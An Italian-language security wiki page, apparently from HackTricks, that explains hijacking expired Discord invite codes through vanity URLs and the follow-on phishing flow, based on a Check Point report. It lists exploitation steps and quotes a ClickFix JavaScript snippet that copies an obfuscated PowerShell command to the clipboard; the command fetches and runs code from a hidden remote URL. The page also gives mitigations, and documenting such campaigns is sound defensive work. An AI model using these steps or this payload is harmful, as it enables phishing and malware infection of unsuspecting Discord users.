# Hijacking degli inviti Discord

{{#include ../../banners/hacktricks-training.md}}

Il hijacking degli inviti Discord sfrutta le regole di riutilizzo dei vanity link personalizzati: un codice di invito temporaneo scaduto o un codice permanente eliminato composto solo da lettere minuscole e cifre può essere registrato come vanity link su un server con Level 3 Boost. Un vanity link personalizzato può diventare disponibile anche quando il server originale perde il proprio Level 3 Boost; per un invito temporaneo contenente lettere maiuscole, un attacker può pre-registrare la forma vanity in minuscolo mentre l'invito normale rimane attivo, ma il reindirizzamento inizia solo dopo la scadenza dell'invito.<sup>[[1]](#references)[[2]](#references)</sup>

## Tipi di invito e rischio di hijacking

Il rischio osservato varia in base al tipo di invito:<sup>[[1]](#references)[[2]](#references)</sup>

| Tipo di invito              | Hijackabile? | Condizione / Commenti                                                                                       |
|-----------------------------|--------------|--------------------------------------------------------------------------------------------------------------|
| Link di invito temporaneo   | ✅           | Dopo la scadenza, il codice diventa disponibile e può essere nuovamente registrato come vanity URL da un server boosted. |
| Link di invito permanente   | ⚠️           | Se eliminato e composto solo da lettere minuscole e cifre, il codice potrebbe diventare nuovamente disponibile.        |
| Vanity link personalizzato  | ✅           | Se il server originale perde il proprio Level 3 Boost, il suo vanity invite diventa disponibile per una nuova registrazione.    |

## Passaggi di exploitation

1. Reconnaissance
- Monitorare fonti pubbliche (forum, social media, canali Telegram) alla ricerca di link di invito corrispondenti al pattern `discord.gg/{code}` o `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Raccogliere i codici di invito di interesse (temporanei o vanity).<sup>[[1]](#references)</sup>
2. Pre-registrazione
- Creare o utilizzare un server Discord esistente con privilegi Level 3 Boost.<sup>[[1]](#references)[[2]](#references)</sup>
- In **Server Settings → Vanity URL**, provare ad assegnare il codice di invito target. Se accettato, il codice viene riservato dal server malicious.<sup>[[1]](#references)</sup>
3. Attivazione dell'hijack
- Per gli inviti temporanei, attendere la scadenza dell'invito originale (oppure eliminarlo manualmente se si controlla la source).<sup>[[1]](#references)</sup>
- Per i codici contenenti lettere maiuscole, la variante in minuscolo può essere reclamata immediatamente, anche se il reindirizzamento si attiva solo dopo la scadenza.<sup>[[1]](#references)</sup>
4. Reindirizzamento silenzioso
- Gli utenti che visitano il vecchio link vengono inviati senza soluzione di continuità al server controllato dall'attacker una volta attivo l'hijack.<sup>[[1]](#references)</sup>

## Phishing tramite server Discord

1. Limitare i canali del server in modo che sia visibile solo un canale **#verify**.<sup>[[1]](#references)</sup>
2. Distribuire un bot (ad esempio, **Safeguard#0786**) per chiedere ai nuovi arrivati di effettuare la verifica tramite OAuth2.<sup>[[1]](#references)</sup>
3. Il bot reindirizza gli utenti a un sito di phishing (ad esempio, `captchaguard.me`) con il pretesto di un CAPTCHA o di un passaggio di verifica.<sup>[[1]](#references)</sup>
4. Implementare il trucco UX **ClickFix**:<sup>[[1]](#references)</sup>
- Visualizzare un messaggio CAPTCHA non funzionante.
- Guidare gli utenti ad aprire la finestra di dialogo **Win+R**, incollare un comando PowerShell precaricato e premere Invio.

### Esempio di iniezione negli appunti tramite ClickFix

La campagna utilizzava JavaScript per copiare un comando PowerShell malicious negli appunti:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Questo approccio evita i download diretti dei file e sfrutta elementi dell'interfaccia familiai per ridurre i sospetti degli utenti.<sup>[[1]](#references)</sup>

## Mitigations

- Preferire link di invito permanenti e assicurarsi che il codice contenga almeno una lettera maiuscola; i codici permanenti eliminati contenenti lettere maiuscole non possono essere riutilizzati come vanity links.<sup>[[1]](#references)</sup>
- Ruotare regolarmente i codici di invito e revocare i vecchi link.
- Monitorare lo stato dei boost del server Discord e le richieste di vanity URL.<sup>[[1]](#references)[[2]](#references)</sup>
- Informare gli utenti affinché verifichino l'autenticità del server ed evitino di eseguire comandi incollati dagli appunti.

## References

- [1] [Dalla fiducia alla minaccia: gli inviti Discord compromessi utilizzati per la distribuzione di malware in più fasi](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Link di invito personalizzato – Supporto Discord](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
